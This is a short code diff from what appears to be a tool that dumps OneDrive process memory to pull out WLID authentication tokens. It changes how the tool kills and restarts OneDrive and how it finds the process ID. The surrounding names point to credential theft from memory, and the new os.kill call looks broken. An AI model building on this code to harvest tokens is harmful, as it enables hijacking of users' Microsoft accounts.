@@ -26,19 +26,29 @@ TOKEN_SEARCH_VALUES = [WLID_TOKEN_PREFIX, WLID_TOKEN_PREFIX_BACKUP]
 MINIDUMP_TYPE_MiniDumpWithFullMemory = 2
 
 
-def restart_onedrive(onedrive_info: OneDriveInfo, skip_shutdown: bool = False):
-    if not skip_shutdown:
-        process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\" /shutdown", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        process.wait()
-        time.sleep(WAIT_FOR_ONEDRIVE_TO_SHUTDOWN_DELAY)
-    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def get_process_pid_by_name(process_name, username=None):
     for proc in psutil.process_iter():
         if process_name in proc.name():
-            if username and username == proc.username():
+            is_same_username = False
+            try:
+                proc_username = proc.username()
+                is_same_username = username == proc_username
+            except psutil.AccessDenied:
+                pass
+                
+            if username and is_same_username:
                 return proc.pid
     return None
+
+
+def restart_onedrive(onedrive_info: OneDriveInfo, skip_shutdown: bool = False):
+    if not skip_shutdown:
+        current_user = win32api.GetUserNameEx(win32con.NameSamCompatible)
+        onedrive_pid = get_process_pid_by_name(ONEDRIVE_PROCESS_NAME, username=current_user)
+        os.kill(onedrive_pid)
+    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 def extract_wlid_token_from_buffer_in_index(dump_buffer, token_start_index):
     try:
